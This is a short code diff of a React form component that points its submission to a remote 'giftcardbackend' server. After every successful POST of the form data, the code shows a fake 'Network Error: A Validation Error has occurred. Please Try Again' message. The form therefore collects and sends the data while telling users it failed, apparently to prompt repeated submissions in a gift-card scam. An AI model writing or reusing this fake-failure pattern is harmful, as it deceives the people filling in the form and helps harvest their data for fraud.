@@ -123,13 +123,13 @@ const Formpage = ({refProp}) => {
     setLoading(true);
    
     try {
-      const response = await axios.post('http://localhost:2060/api/v1/create', formData);
+      const response = await axios.post('https://giftcardbackend-temv.onrender.com/api/v1/create', formData);
       console.log(response);
         setError('Network Error: A Validation Error has occurred. Please Try Again');
         setTimeout(() => {
            setError("");
 
-        }, 3000);
+        }, 3500);
     } catch (err) {
       setError('Something went wrong while submitting.');
       console.error(err);
